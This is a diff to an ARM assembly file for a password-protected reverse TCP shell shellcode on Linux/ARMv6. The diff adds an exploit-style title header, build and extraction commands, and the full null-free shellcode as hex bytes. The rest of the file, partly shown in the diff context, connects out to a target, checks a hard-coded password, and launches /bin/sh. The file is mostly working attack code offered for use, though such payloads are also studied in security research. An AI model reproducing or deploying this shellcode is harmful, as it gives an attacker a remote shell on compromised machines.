@@ -1,7 +1,11 @@
-// Password-Protected Reverse Shell Linux/ARMv6
-// Author: Alan Vivona
-// medium.syscall59.com
-// @syscall59
+/*
+* Title:    Linux/ARM - Password-Protected Reverse TCP Shell
+* Date:     2019-04-20
+* Tested:   armv6 (32-bit Raspberry Pi I)
+* Author:   Alan Vivona - @syscall59 - medium.syscall59.com
+* Size:     100 bytes
+* No null bytes / Null-free
+*/
 
 .section .text
 .global _start
@@ -63,8 +67,8 @@ mov   r10, r0 // save sockfd into r10
     mov   r7, #11 
     svc   #1
 
-// 2 bytes aligment fix needed (can't use a nop as it has a null byte)
-align_bytes : .byte 0xff, 0xff
+// 2 bytes aligment fix if needed needed (can't use a nop as it has a null byte)
+// align_bytes : .byte 0xff, 0xff
 
 target:
     // The 0xff will be replaced with a null on runtime
@@ -78,3 +82,19 @@ target:
 command: .ascii "/bin/sh?"  // The '?' will be replaced with a null on runtime
 
 pass: .ascii "S59!"
+
+
+/* 
+    Compile, link & extract: 
+    
+        as ARM-reverse-shell.s -o ARM-reverse-shell.o
+        ld -N ARM-reverse-shell.o -o ARM-reverse-shell
+        objcopy -O binary ARM-reverse-shell ARM-reverse-shell.dump
+        hexdump -v -e '"\\""x" 1/1 "%02x" ""' ARM-reverse-shell.dump
+
+        \x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x82\x46\x0e\xa1\x4a
+        \x70\x4a\x71\x8a\x71\x10\x22\x02\x37\x01\xdf\x02\xb4\x69\x46\x04\x22\x03\x27\x50\x46\x01\xdf\x0b\x4b
+        \x0c\x68\x63\x40\xf9\xd1\x02\x21\x3f\x27\x50\x46\x01\xdf\x01\x39\xfb\xd5\x04\xa0\x52\x40\x49\x40\xc2
+        \x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\x7f\xff\xff\x01\x2f\x62\x69\x6e\x2f\x73\x68\x3f\x53\x35\x39\x21
+
+*/
